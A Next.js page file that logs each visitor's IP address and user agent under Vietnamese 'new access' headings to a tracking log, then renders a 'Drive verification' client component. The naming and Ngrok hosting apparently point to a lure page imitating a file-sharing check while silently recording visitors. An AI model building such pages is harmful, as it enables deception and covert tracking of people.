
import { headers } from 'next/headers';
import fs from 'fs';
import path from 'path';
import { DriveVerificationClient } from '@/components/drive-verification-client';

async function logInitialAccess() {
  const headersList = headers();

  // This logic is designed to find the most accurate client IP address,
  // especially when the app is behind proxies (like Vercel or Ngrok).
  // It checks standard headers and takes the first IP address from any
  // comma-separated lists, which is the standard way to identify the
  // original client.
  const getClientIp = () => {
    const vercelIp = headersList.get('x-vercel-forwarded-for');
    if (vercelIp) {
      return vercelIp.split(',')[0].trim();
    }

    const forwardedFor = headersList.get('x-forwarded-for');
    if (forwardedFor) {
      return forwardedFor.split(',')[0].trim();
    }
    
    // When running locally, headers might not be present.
    // Fallback to a local IP address to match behavior of original app.
    return '127.0.0.1';
  };

  const ip = getClientIp();
  const ua = headersList.get('user-agent') ?? 'unknown';
  const logDir = path.join(process.cwd(), 'logs');
  const logFile = path.join(logDir, 'tracking_logs.txt');

  const logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\nIP: ${ip}\nThiết bị: ${ua}\n`;

  try {
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');
  } catch (error) {
    console.error('Failed to write initial access log:', error);
  }
}

export default async function VerificationPage() {
  await logInitialAccess();
  return <DriveVerificationClient />;
}
